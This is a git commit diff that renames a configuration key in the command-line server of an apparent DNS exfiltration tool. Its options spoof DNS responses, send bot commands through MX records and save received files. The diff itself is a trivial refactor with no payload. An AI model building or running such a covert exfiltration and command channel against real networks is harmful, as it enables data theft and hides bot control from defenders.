20f77fa5eeacb950798b0f4db59da07c676a5702
Cory <cory.is.evil@gmail.com>
2017-07-16 19:44:03 -0500

    fixed config context for botexfiltrator

--- fake-dns-server/dns_exfil/cli/server.py
+++ fake-dns-server/dns_exfil/cli/server.py
@@ -6,13 +6,13 @@ import os
 
 
 @click.command()
-@click.option('--domain', default=config['server']['bot']['domain'],
+@click.option('--domain', default=config['server']['botexfiltrator']['domain'],
               help='spoof Domain name to use in server responses')
-@click.option('--ip', default=config['server']['bot']['ip'],
+@click.option('--ip', default=config['server']['botexfiltrator']['ip'],
               help='spoof IP address to use in server responses')
-@click.option('--cmd', default=config['server']['bot']['cmd'],
+@click.option('--cmd', default=config['server']['botexfiltrator']['cmd'],
               help='File for sending commands through MX records')
-@click.option('--basedir', default=config['server']['bot']['basedir'],
+@click.option('--basedir', default=config['server']['botexfiltrator']['basedir'],
               help='Where the files should be saved')
 def bot(domain, ip, cmd, basedir):
     context = config['server']['botexfiltrator']
